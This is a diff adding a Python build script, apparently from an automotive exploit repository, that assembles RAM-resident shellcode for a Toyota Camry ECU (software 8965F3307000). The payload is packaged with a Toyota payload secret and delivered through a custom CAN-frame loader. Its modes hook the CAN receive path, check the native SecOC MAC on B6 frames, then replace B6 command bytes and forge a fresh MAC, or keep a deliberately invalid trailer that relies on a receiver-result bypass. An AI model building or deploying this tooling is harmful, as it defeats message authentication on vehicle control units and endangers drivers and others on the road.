@@ -1,0 +1,405 @@
+#!/usr/bin/env python3
+"""Build the exact-F33 split high-tail/low-RAM inline B6 signing runtime."""
+from __future__ import annotations
+
+import argparse, json, struct, subprocess, tempfile
+from pathlib import Path
+
+from tools import REPO_ROOT as REPO
+
+
+from exploit.common.payload_package import package_shellcode
+from exploit.common.ram_exec import TOYOTA_P1ME_PAYLOAD_BUILD_SECRET
+from tools.targets.corolla.research.ram_runtime.build_corolla_hf_command5_carrier import validate_toolchain
+from tools.targets.camry.research.ram_runtime.monitor.build_camry_f33_runtime_replay_discriminator import BOOT_SYMBOLS, IMAGE, IMAGE_SHA256, RESIDENT_BASE, RESIDENT_LIMIT, RESIDENT_SYMBOLS, STAGING_BASE, STAGING_LIMIT, STAGING_RESIDENT_OFFSET, compile_asm, jarl_targets, nm_symbol, sha_bytes, sha_file, staging_source, verify_static_contract
+
+RESIDENT_SOURCE = REPO / "tools/targets/camry/research/ram_runtime/b6/camry_f33_b6_inline_signer_resident.S"
+HELPER_SOURCE = REPO / "tools/targets/camry/research/ram_runtime/b6/camry_f33_b6_inline_signer_helper.S"
+CONTINUOUS_HELPER_SOURCE = REPO / "tools/targets/camry/research/ram_runtime/b6/camry_f33_b6_inline_signer_continuous_helper.S"
+SUPERVISED_HELPER_SOURCE = REPO / "tools/targets/camry/research/ram_runtime/b6/camry_f33_b6_inline_signer_supervised_helper.S"
+STAGE5_CARRIER_HELPER_SOURCE = REPO / "tools/targets/camry/research/ram_runtime/b6/camry_f33_b6_stage5_carrier_helper.S"
+INGRESS_HELPER_SOURCE = REPO / "tools/targets/camry/research/ram_runtime/b6/camry_f33_b6_ingress_helper.S"
+BUILDER = Path(__file__).resolve()
+DEFAULT_OUTPUT_DIR = REPO / "build/out/ephemeral-runtime/camry-f33-b6-inline-signer"
+CONTINUOUS_OUTPUT_DIR = REPO / "build/out/ephemeral-runtime/camry-f33-b6-inline-signer-continuous"
+STAGE5_CARRIER_OUTPUT_DIR = REPO / "build/out/ephemeral-runtime/camry-f33-b6-stage5-carrier"
+INGRESS_OUTPUT_DIR = REPO / "build/out/ephemeral-runtime/camry-f33-b6-ingress-helper"
+
+HELPER_BASE = 0xFEBF0000
+EXPECTED_HELPER_WORDS = 150
+CONTINUOUS_HELPER_PADDED_SHA256 = "b417e12dde0dc7d6478ea6f242fe9eaa246a00a9fbbcc711a5d2d3adcf159a28"
+STATE_BASE = 0xFEBF025C
+STATE_SIZE = 12
+
+AUDITED_DIR = REPO / "tools/targets/camry/research/ram_runtime/b6/audited"
+AUDITED_METADATA = {
+    "signed": REPO / "tools/targets/camry/research/ram_runtime/b6/audited/audited_camry_f33_b6_inline_signer_build.json",
+    "continuous-signed": REPO / "tools/targets/camry/research/ram_runtime/b6/audited/audited_camry_f33_b6_inline_signer_continuous_build.json",
+    "supervised-signed": REPO / "tools/targets/camry/research/ram_runtime/b6/audited/audited_camry_f33_b6_inline_signer_supervised_build.json",
+    "ingress-observer": REPO / "tools/targets/camry/research/ram_runtime/b6/audited/audited_camry_f33_b6_ingress_helper_build.json",
+}
+AUDITED_ARTIFACT_KEYS = {
+    "signed": ("helper_padded", "staging"),
+    "continuous-signed": ("resident", "helper", "helper_padded", "staging", "authenticated_payload"),
+    "supervised-signed": ("resident", "helper", "helper_padded", "staging", "authenticated_payload"),
+    "ingress-observer": ("helper_padded",),
+}
+
+
+def promote_audited(mode: str, meta: dict[str, object], artifacts: dict[str, tuple[Path, bytes]]) -> None:
+    if mode not in AUDITED_METADATA:
+        raise RuntimeError(f"mode {mode} has no tracked audited artifact contract")
+    AUDITED_DIR.mkdir(parents=True, exist_ok=True)
+    for key in AUDITED_ARTIFACT_KEYS[mode]:
+        path, blob = artifacts[key]
+        (AUDITED_DIR / path.name).write_bytes(blob)
+    AUDITED_METADATA[mode].write_text(
+        json.dumps(meta, indent=2, sort_keys=True) + "\n", encoding="utf-8")
+    print(f"Promoted reviewed {mode} artifacts to {AUDITED_DIR}")
+
+STATE_MAGIC = 0x53364249
+HELPER_LIMIT = STATE_BASE - HELPER_BASE
+TELEMETRY_BASE = 0xFEBF0268
+TELEMETRY_SIZE = 0x20
+APPLICATION_RMBA_PROTECTED_START = 0xFEBF0288
+SCRATCH_BASE = APPLICATION_RMBA_PROTECTED_START
+SCRATCH_END = 0xFEBF02D0
+PRIVATE_STATE_BASE = SCRATCH_END
+PRIVATE_STATE_END = 0xFEBF02F8
+LOW_UNREFERENCED_END = 0xFEBF0308
+CONTROL_ID = 0x1FDC0002
+CONTROL_STAGING = 0xFEBE4C34
+B6_QUEUE_RECORD = 0xFEBE547A
+B6_SECURED_BUFFER = 0xFEBE54D4
+AUTH_SYNC = 0xFEBE55C0
+B6_COMMITTED = 0xFEBE55E8
+COMMAND5_SYNC = 0x00089BC2
+MEM_COPY = 0x00089F2E
+FRESHNESS_ENCODE = 0x00090566
+STOCK_7A254_TAIL = 0x0007A272
+STOCK_667E6_TAIL = 0x000667F2
+EXTRA = {
+    "agg_69ca2": 0x00069CA2,
+    "rx_7be3c": 0x0007BE3C,
+    "rx_7bbc2": 0x0007BBC2,
+    "rx_7c43c": 0x0007C43C,
+    "rx_79ede": 0x00079EDE,
+    "stock_7a254_after_79ede": STOCK_7A254_TAIL,
+    "stock_667e6_tail": STOCK_667E6_TAIL,
+}
+
+
+def _pins(image: bytes) -> dict[str, object]:
+    if image[0x667E6:0x66806] != bytes.fromhex(
+        "8007210080ffb83481ff663a83ffd02080ff8636bfff6423bfff14fd40063f00"
+    ):
+        raise RuntimeError("0x667E6 body drift")
+    if image[0x7A254:0x7A272] != bytes.fromhex(
+        "80072100e40ff385a10601feaa3580ffda1b80ff5c1980ffd221bfff70fc"
+    ):
+        raise RuntimeError("0x7A254 receive prefix drift")
+    if image[0x7A272:0x7A2C8] != bytes.fromhex(
+        "80ffee1c2436ea85013a80ff9e2d2436ee8580ff3e342436ec8580ff1234"
+        "80ffc21b80ff983280ffa01b80ff9e1b80ffa01b80ffde4b80ff8a48bfff6afc"
+        "80ff8a3ebfff5c0180ff7a8bbfff7afc80ff7e1b40063f00"
+    ):
+        raise RuntimeError("0x7A254 stock tail drift")
+    if bytes.fromhex("80ff186b") not in image[0x79EDE:0x79F16]:
+        raise RuntimeError("79EDE receive-drain anchor drift")
+    if image[0x8E886:0x8E89E] != bytes.fromhex(
+        "240e6a9c0052010d240e649c030d240eac9c050d030a860c"
+    ):
+        raise RuntimeError("type-1 queue/buffer geometry drift")
+    if 0xFEBE546A + 2 * 8 != B6_QUEUE_RECORD:
+        raise RuntimeError("B6 profile-2 queue-record geometry drift")
+    profile2 = 0x25848 + 2 * 0x50
+    if struct.unpack_from("<I", image, profile2 + 0x08)[0] != 0x00B60080:
+        raise RuntimeError("B6 profile CAN-ID/format entry drift")
+    if struct.unpack_from("<I", image, profile2 + 0x24)[0] != 32:
+        raise RuntimeError("B6 profile length drift")
+    if 0xFEBE54AC + struct.unpack_from("<I", image, profile2 + 0x28)[0] != B6_SECURED_BUFFER:
+        raise RuntimeError("B6 secured-buffer drift")
+    if image[0x89C04:0x89C08] != bytes.fromhex("bfff3cf8"):
+        raise RuntimeError("command5 wrapper dispatch call drift")
+    if image[0x89C4C:0x89C5A] != bytes.fromhex("4437bd5b010a440fbc5b00527f00"):
+        raise RuntimeError("command5 completion callback drift")
+    if image[0x88BA2:0x88BAA] != bytes.fromhex("260f0100610ada0d"):
+        raise RuntimeError("command5 config-type gate drift")
+    if image[0x8A824:0x8A82E] != bytes.fromhex("d092920e050080070f08"):
+        raise RuntimeError("command5 selector/opcode write drift")
+    if HELPER_BASE + HELPER_LIMIT != STATE_BASE:
+        raise RuntimeError("inline signer helper limit must end exactly at host-visible state")
+    if TELEMETRY_BASE != STATE_BASE + STATE_SIZE:
+        raise RuntimeError("inline signer telemetry must begin immediately after state")
+    if TELEMETRY_BASE + TELEMETRY_SIZE > APPLICATION_RMBA_PROTECTED_START:
+        raise RuntimeError("inline signer host-visible telemetry crosses the exact-F33 SID23 exclusion")
+    if SCRATCH_BASE != APPLICATION_RMBA_PROTECTED_START or SCRATCH_END - SCRATCH_BASE != 0x48:
+        raise RuntimeError("inline signer command5 scratch geometry drift")
+    if PRIVATE_STATE_BASE != SCRATCH_END or PRIVATE_STATE_END > LOW_UNREFERENCED_END:
+        raise RuntimeError("inline signer private control state exceeds the reference-free low-RAM pocket")
+    return {
+        "midaggregate_boundary": "after 0x79EDE receive-ring drain, before untouched 0x7A272 tail/0x6A410 SecOC",
+        "helper_mpu": "FEBF0000..FEBF02F7 lies in exact-F33 MPU region5 FEBEF400..FEBF33FC, MPAT 0xB8 in both application contexts; the existing scalar-reference census remains empty through FEBF0307",
+        "b6_queue_record": f"0x{B6_QUEUE_RECORD:08X}",
+        "b6_secured_buffer": f"0x{B6_SECURED_BUFFER:08X}",
+        "authenticated_sync": f"0x{AUTH_SYNC:08X}",
+        "committed_b6_freshness": f"0x{B6_COMMITTED:08X}",
+    }
+
+
+def _source_contract(*, mode: str, helper_source: Path) -> None:
+    rs = RESIDENT_SOURCE.read_text()
+    hs = HELPER_SOURCE.read_text()
+    for token in (
+        "jarl32 signed_aggregate, lp", "jarl32 signed_7a254, lp", "jarl32 rx_79ede, lp",
+        "jarl32 helper_entry, lp", "ld.hu -0x6bcc[gp]", "st.b r8, 0x4a60[gp]",
+        "ld.hu -0x7a0e[gp], r1", "xori 0xfe01, r1, r0", "tst1 0, 0x4a62[gp]",
+        "tst1 0, 0x4a61[gp]", "movea 150, r0, r7", "movea 0x4a64, gp, r7", "movea 9, r0, r8",
+        "ld.w 0x4a54[gp], r9", "syncp", "synci", "set1 0, 0x4a62[gp]",
+        "jr32 stock_7a254_after_79ede", "jr32 stock_667e6_tail",
+    ):
+        if token not in rs:
+            raise RuntimeError(f"resident source contract missing {token!r}")
+    signer_tokens = (
+        "ld.hu -0x6386[gp]", "ld.w -0x6310[gp]", "ld.hu -0x6bcc[gp]", "mov 0xc700, r7",
+        "jarl32 command5_sync, lp", "jarl32 mem_copy, lp", "movea 0x4a88, gp, r6",
+        "jarl32 freshness_encode, lp",
+        "ori 0x0b, r6, r6", "andi 0xfb, r6, r6", "movea 100, r0, r6",
+        "st.b r10, 0x4a63[gp]", "ld.w 0x4a64[gp], r6", "st.w r6, 0x4a64[gp]",
+        "st.w r10, 0x4a68[gp]", "st.w r10, 0x4a6c[gp]", "st.w r6, 0x4a70[gp]", "st.w r6, 0x4af0[gp]",
+        "bsw r7, r7", "bsw r6, r6", "st.w r6, 0x4a74[gp]", "st.b r8, 0x4a78[gp]",
+        "st.b r6, 0x4a79[gp]", "st.b r6, 0x4a7a[gp]", "st.b r6, 0x4a7b[gp]",
+        "st.w r6, -0x6310[gp]", "movea 7, r0, r8",
+    )
+    if mode != "ingress-observer":
+        for token in signer_tokens:
+            if token not in hs:
+                raise RuntimeError(f"helper source contract missing {token!r}")
+    for forbidden in (
+        "ld.hu -0x7a0e[gp], r6", "movea -0x1ff, r0, r7",
+    ):
+        if forbidden in rs:
+            raise RuntimeError(f"resident recreates forbidden stock-gate register drift {forbidden!r}")
+    if rs.index("jarl32 signed_aggregate, lp") > rs.index("tst1 0, 0x4a61[gp]"):
+        raise RuntimeError("loader/control logic moved ahead of the complete foreground aggregate")
+    for source in (rs, hs, helper_source.read_text()):
+        for forbidden in ("jmp [", "jarl [", "ICUSCMD", "can_send"):
+            if forbidden in source:
+                raise RuntimeError(f"forbidden construct {forbidden!r}")
+    if mode == "stage5-carrier":
+        carrier = helper_source.read_text()
+        if '#define F33_STAGE5_CARRIER 1' not in carrier or '#include "camry_f33_b6_inline_signer_helper.S"' not in carrier:
+            raise RuntimeError("stage5-carrier helper must select the reviewed shared-helper branch")
+        if "#ifdef F33_STAGE5_CARRIER" not in hs or hs.count("st.w r6, -0x6310[gp]") != 1:
+            raise RuntimeError("shared helper no longer isolates the stage5-carrier trailer branch")
+    if mode == "continuous-signed":
+        continuous = helper_source.read_text()
+        if "cmp r8, r7\n    nop\n    st.b r8, 0x4a78[gp]" not in continuous:
+            raise RuntimeError("continuous helper no longer preserves the live-qualified branch-to-NOP substitution")
+        if "cmp r8, r7\n    be .L_return\n    st.b r8, 0x4a78[gp]" in continuous:
+            raise RuntimeError("continuous helper reverted to one-shot sequence consumption")
+    if mode == "ingress-observer":
+        ingress = helper_source.read_text()
+        for token in (
+            "ld.hu -0x638e[gp]", "ld.hu -0x6386[gp]", "ld.bu -0x6329[gp]",
+            "st.w r6, 0x4a68[gp]", "st.w r6, 0x4a6c[gp]",
+            "st.w r6, 0x4a70[gp]", "st.w r6, 0x4a74[gp]",
+            "st.w r6, 0x4a78[gp]", "st.w r6, 0x4a7c[gp]",
+            "st.w r6, 0x4a80[gp]", "st.w r6, 0x4a84[gp]",
+        ):
+            if token not in ingress:
+                raise RuntimeError(f"ingress helper source contract missing {token!r}")
+        for forbidden in ("command5_sync", "mem_copy", "freshness_encode"):
+            if forbidden in ingress:
+                raise RuntimeError(f"ingress helper contains forbidden mutation primitive {forbidden!r}")
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(description=__doc__)
+    
+    ap.add_argument("--mode", choices=("signed", "continuous-signed", "supervised-signed", "stage5-carrier", "ingress-observer"), default="signed")
+    ap.add_argument("--output-dir", type=Path)
+    ap.add_argument(
+        "--promote-audited", action="store_true",
+        help="replace the tracked audited files for this reviewed mode")
+    args = ap.parse_args()
+    helper_source = {
+        "signed": HELPER_SOURCE,
+        "continuous-signed": CONTINUOUS_HELPER_SOURCE,
+        "supervised-signed": SUPERVISED_HELPER_SOURCE,
+        "stage5-carrier": STAGE5_CARRIER_HELPER_SOURCE,
+        "ingress-observer": INGRESS_HELPER_SOURCE,
+    }[args.mode]
+    default_output = {
+        "signed": DEFAULT_OUTPUT_DIR,
+        "continuous-signed": CONTINUOUS_OUTPUT_DIR,
+        "supervised-signed": REPO / "build/out/ephemeral-runtime/camry-f33-b6-inline-signer-supervised",
+        "stage5-carrier": STAGE5_CARRIER_OUTPUT_DIR,
+        "ingress-observer": INGRESS_OUTPUT_DIR,
+    }[args.mode]
+    output_dir = args.output_dir or default_output
+    output_prefix = {
+        "signed": "camry_f33_b6_inline_signer",
+        "continuous-signed": "camry_f33_b6_inline_signer_continuous",
+        "supervised-signed": "camry_f33_b6_inline_signer_supervised",
+        "stage5-carrier": "camry_f33_b6_stage5_carrier",
+        "ingress-observer": "camry_f33_b6_ingress_helper",
+    }[args.mode]
+    
+    image = IMAGE.read_bytes()
+    if sha_bytes(image) != IMAGE_SHA256:
+        ap.error("8965F3307000 image identity mismatch")
+    try:
+        verify_static_contract(image); pins = _pins(image); _source_contract(mode=args.mode, helper_source=helper_source)
+    except (OSError, RuntimeError, ValueError) as exc:
+        ap.error(str(exc))
+
+    
+    with tempfile.TemporaryDirectory(prefix="camry-f33-inline-signer-") as td:
+        work = Path(td)
+        try:
+            toolchain = validate_toolchain(work / "toolchain")
+            helper = compile_asm(work=work,
+            source=str(helper_source.relative_to(REPO)), stem="helper", vma=HELPER_BASE,
+            symbols={
+                "command5_sync": COMMAND5_SYNC,
+                "freshness_encode": FRESHNESS_ENCODE,
+                "mem_copy": MEM_COPY,
+            },
+            source_in_repo=True,)
+            helper_blob = helper["blob"]; assert isinstance(helper_blob, bytes)
+            if nm_symbol(str(helper["nm"]), "helper_entry") != HELPER_BASE:
+                raise RuntimeError("helper entry VMA drift")
+            if len(helper_blob) > HELPER_LIMIT:
+                raise RuntimeError(f"helper too large: {len(helper_blob)} > {HELPER_LIMIT}")
+            if len(helper_blob) > EXPECTED_HELPER_WORDS * 4:
+                raise RuntimeError(f"helper exceeds fixed loader transfer: {len(helper_blob)} > {EXPECTED_HELPER_WORDS * 4}")
+            helper_padded = helper_blob + b"\0" * (EXPECTED_HELPER_WORDS * 4 - len(helper_blob))
+            if args.mode == "continuous-signed" and sha_bytes(helper_padded) != CONTINUOUS_HELPER_PADDED_SHA256:
+                raise RuntimeError("continuous helper no longer reproduces the exact live-loaded 600-byte image")
+            helper_words = len(helper_padded) // 4
+            if helper_words != EXPECTED_HELPER_WORDS:
+                raise RuntimeError(f"helper word-count drift: {helper_words} != {EXPECTED_HELPER_WORDS}")
+            if helper_words >= 0xFF:
+                raise RuntimeError("helper word count collides with arm opcode")
+            helper_targets = jarl_targets(str(helper["disasm"]))
+            expected_targets = [] if args.mode == "ingress-observer" else [MEM_COPY, FRESHNESS_ENCODE, COMMAND5_SYNC, MEM_COPY]
+            if helper_targets != expected_targets:
+                raise RuntimeError(f"helper JARL target drift: {helper_targets}")
+
+            symbols = {**RESIDENT_SYMBOLS, **EXTRA, "helper_entry": HELPER_BASE}
+            resident = compile_asm(work=work,
+            source=str(RESIDENT_SOURCE.relative_to(REPO)), stem="resident", vma=RESIDENT_BASE,
+            symbols=symbols, source_in_repo=True,)
+            resident_blob = resident["blob"]; assert isinstance(resident_blob, bytes)
+            if nm_symbol(str(resident["nm"]), "resident_entry") != RESIDENT_BASE:
+                raise RuntimeError("resident entry VMA drift")
+            if len(resident_blob) > RESIDENT_LIMIT:
+                raise RuntimeError(f"resident too large: {len(resident_blob)} > {RESIDENT_LIMIT}")
+            if resident["relocations"] or helper["relocations"]:
+                raise RuntimeError("inline signer must have zero relocations")
+            resident_disasm = str(resident["disasm"])
+            resident_targets = jarl_targets(resident_disasm)
+            if resident_disasm.count(f"movea\t{EXPECTED_HELPER_WORDS}, r0, r7") != 2:
+                raise RuntimeError(f"resident helper-count literal {EXPECTED_HELPER_WORDS} did not survive assembly/link exactly twice")
+            if "satsubi\t0, r25, r7" in resident_disasm:
+                raise RuntimeError("resident recreated linker-relaxed helper-count corruption")
+            for target in (*EXTRA.values(), HELPER_BASE):
+                if target not in resident_targets and target not in (STOCK_7A254_TAIL, STOCK_667E6_TAIL):
+                    raise RuntimeError(f"required resident call target missing: 0x{target:08X}")
+
+            (work / "resident.bin").write_bytes(resident_blob)
+            (work / "staging.S").write_text(staging_source(len(resident_blob)), encoding="utf-8")
+            stage = compile_asm(work=work, source="staging.S", stem="staging",
+            vma=STAGING_BASE, symbols=BOOT_SYMBOLS, source_in_repo=False,)
+            stage_blob = stage["blob"]; assert isinstance(stage_blob, bytes)
+            if len(stage_blob) > STAGING_LIMIT:
+                raise RuntimeError(f"staging too large: {len(stage_blob)} > {STAGING_LIMIT}")
+            if stage_blob[STAGING_RESIDENT_OFFSET:STAGING_RESIDENT_OFFSET+len(resident_blob)] != resident_blob:
+                raise RuntimeError("staging does not embed resident byte-exact")
+        except (OSError, RuntimeError, subprocess.CalledProcessError, ValueError) as exc:
+            ap.error(str(exc))
+
+        payload = package_shellcode(stage_blob, secret=TOYOTA_P1ME_PAYLOAD_BUILD_SECRET)
+        output_dir.mkdir(parents=True, exist_ok=True)
+        rp = output_dir / f"{output_prefix}_resident.bin"
+        hp = output_dir / f"{output_prefix}_helper.bin"
+        hpp = output_dir / f"{output_prefix}_helper_padded.bin"
+        sp = output_dir / f"{output_prefix}.bin"
+        pp = output_dir / f"{output_prefix}_payload.bin"
+        rp.write_bytes(resident_blob); hp.write_bytes(helper_blob); hpp.write_bytes(helper_padded); sp.write_bytes(stage_blob); pp.write_bytes(payload)
+        loader = {
+            "can_id": f"0x{CONTROL_ID:08X}",
+            "staging": f"0x{CONTROL_STAGING:08X}",
+            "frame": "00 C6 seq word_index word_le32; word_index FF arms after exact sequential word count",
+            "state": {"base": f"0x{STATE_BASE:08X}", "size": STATE_SIZE, "magic": f"0x{STATE_MAGIC:08X}", "layout": "magic:u32, next_index:u8, initialized:u8, armed:u8, last_command5_rc:u8, signed_count:u32"},
+            "telemetry": {
+                "base": f"0x{TELEMETRY_BASE:08X}",
+                "size": TELEMETRY_SIZE,
+                "layout": (
+                    "observation_count:u32, d7_queue32_count:u32, b6_queue32_count:u32, id63_marker_count:u32, last_id63_signature:B0..B11||B28..B31"
+                    if args.mode == "ingress-observer" else
+                    "native_frame_count:u32, command5_attempts:u32, oracle_native_trailer:bytes4, oracle_computed_trailer:bytes4, last_control_seq:u8, native_verified:u8, last_done_flag:u8, last_command_status:u8, reconstructed_freshness:{trip:u32,reset:u32,message:u16,reset_low2:u8,length:u8}"
+                ),
+            },
+            "scratch": {"base": f"0x{SCRATCH_BASE:08X}", "size": SCRATCH_END-SCRATCH_BASE, "sid23_readable": False},
+        }
+        if args.mode != "ingress-observer":
+            loader["runtime_control_frame"] = (
+                "00 C7 seq 00 target_hi target_lo 00 00; nonzero seq remains active for every distinct native B6 until sequence zero"
+                if args.mode == "continuous-signed" else
+                "00 C7 seq 00 target_hi target_lo 00 00; nonzero seq is one-shot and mode is implicit ID11 replacement"
+            )
+
+        meta = {
+            "schema": "camry-f33-b6-inline-signer-build-v1",
+            "mode": args.mode,
+            "target": {"software_id": "8965F3307000", "codeflash_sha256": IMAGE_SHA256},
+            "purpose": (
+                "verify Toyota's native B6 SecOC locally, then replace native B6 application fields while deliberately retaining its paired old trailer before the existing stage-5 receiver-result bypass"
+                if args.mode == "stage5-carrier" else
+                "observe D7/B6 admission and exact ID63 marker bytes at the post-79EDE/pre-SecOC boundary without modifying receive state"
+                if args.mode == "ingress-observer" else
+                "continuous diagnostic variant: while C7 sequence is nonzero, replace and re-sign every distinct native B6 before the existing receiver SecOC path"
+                if args.mode == "continuous-signed" else
+                "verify Toyota's native B6 SecOC locally, then optionally replace one native B6 application command and re-sign it before the existing receiver SecOC path"
+            ),
+            "resident": {"path": rp.name, "base": f"0x{RESIDENT_BASE:08X}", "size": len(resident_blob), "headroom": RESIDENT_LIMIT-len(resident_blob), "sha256": sha_bytes(resident_blob), "relocations": resident["relocations"]},
+            "helper": {"path": hp.name, "padded_path": hpp.name, "base": f"0x{HELPER_BASE:08X}", "size": len(helper_blob), "padded_size": len(helper_padded), "word_count": helper_words, "limit": HELPER_LIMIT, "headroom": HELPER_LIMIT-len(helper_blob), "sha256": sha_bytes(helper_blob), "padded_sha256": sha_bytes(helper_padded), "relocations": helper["relocations"]},
+            "staging": {"path": sp.name, "base": f"0x{STAGING_BASE:08X}", "size": len(stage_blob), "sha256": sha_bytes(stage_blob), "relocations": stage["relocations"]},
+            "authenticated_payload": {"path": pp.name, "size": len(payload), "sha256": sha_bytes(payload)},
+            "loader": loader,
+            "static_pins": pins,
+            "mutation_boundary": ({"receive_state_write": False, "secoc_result_override": False, "route44_injection": False, "can_transmit": False, "flash_write": False, "added_write_region": "FEBF0268..FEBF0287 telemetry only"} if args.mode == "ingress-observer" else {"uncommanded_native_b6_unchanged": True, "native_oracle_mutates_queue": False, "replacement_requires_native_mac_equality": True, "command5_failure_leaves_queue_unchanged": True, "replacement_application_bytes": "B3..B9 only", "replacement_trailer_bytes": ("unchanged native B28..B31 (deliberately invalid after B3..B9 mutation)" if args.mode == "stage5-carrier" else "computed B28..B31 only"), "requires_installed_stage5_receiver_result_bypass": args.mode == "stage5-carrier", "secoc_result_override": False, "route44_injection": False, "can_transmit": False, "flash_write": False}),
+            "toolchain": toolchain,
+            "sources": {"resident": {"path": str(RESIDENT_SOURCE.relative_to(REPO)), "sha256": sha_file(RESIDENT_SOURCE)}, "helper": {"path": str(helper_source.relative_to(REPO)), "sha256": sha_file(helper_source)}, "shared_helper": {"path": str(HELPER_SOURCE.relative_to(REPO)), "sha256": sha_file(HELPER_SOURCE)}, "builder": {"path": str(BUILDER.relative_to(REPO)), "sha256": sha_file(BUILDER)}},
+        }
+        if args.mode != "ingress-observer":
+            meta["signer"] = {"trigger": ("each distinct native profile2 B6 is observed once by trailer identity; after the first no-mutation native-MAC oracle, every frame is replaced while the current C7 sequence is nonzero; sequence zero stops replacement" if args.mode == "continuous-signed" else "each distinct native profile2 B6 is observed once by trailer identity; first frame is a no-mutation native-MAC oracle, later replacement requires a fresh nonzero C7 control sequence"), "domain": "00B6 || native-or-replacement B0..B27 || freshness48", "freshness_owner": "exact arithmetic recovered from stock 0x909CA/0x90A48 using received FV4, EPS authenticated sync, and committed ordinary slot 1; disagreement is fail-closed", "native_oracle": "first distinct native B6 is signed locally and its transaction-paired computed FV4||MAC28 must equal Toyota's preserved trailer before replacement is enabled", "replacement": ("after successful command5 construction, copy B3..B9 with ID11, requested B4:B5, signal265=0, and B8/B9=100/100 while deliberately retaining the native B28..B31 trailer" if args.mode == "stage5-carrier" else "scratch only until freshness reconstruction and command5 rc0/done1/status0; then copy B3..B9 with ID11, requested B4:B5, signal265=0, B8/B9=100/100 and write computed B28..B31"), "command5": {"wrapper": f"0x{COMMAND5_SYNC:08X}", "record": 0, "config_type": 1, "selector": 4, "input_length": 36, "output_length": 16}}
+        if args.mode == "supervised-signed":
+            meta["purpose"] = "volatile native-B6 signer with host receive-loss supervision; offline candidate, not live-qualified"
+            loader["runtime_control_frame"] = "00 C7 seq 00 target_hi target_lo 00 00; sequence zero releases, changed nonzero sequence renews seven foreground ticks"
+            meta["signer"]["trigger"] = "native B6 replacement only with nonzero C7 and an unexpired changed host generation"
+            meta["signer"]["host_liveness"] = {
+                "tick_period_ms": 5, "receive_loss_ticks": 7,
+                "remaining_ticks_address": "0xFEBF02D4",
+                "poll_before_native_queue_test": True,
+                "expiration_effect": "native B6 left unchanged",
+                "repeated_sequence_renews": False,
+                "live_qualified": False,
+            }
+        metadata_path = output_dir / f"{output_prefix}.json"
+        metadata_path.write_text(json.dumps(meta, indent=2, sort_keys=True)+"\n")
+        if args.promote_audited:
+            promote_audited(args.mode, meta, {
+                "resident": (rp, resident_blob),
+                "helper": (hp, helper_blob),
+                "helper_padded": (hpp, helper_padded),
+                "staging": (sp, stage_blob),
+                "authenticated_payload": (pp, payload),
+            })
+        print(json.dumps(meta, indent=2, sort_keys=True))
+    return 0
+
+if __name__ == "__main__":
+    raise SystemExit(main())
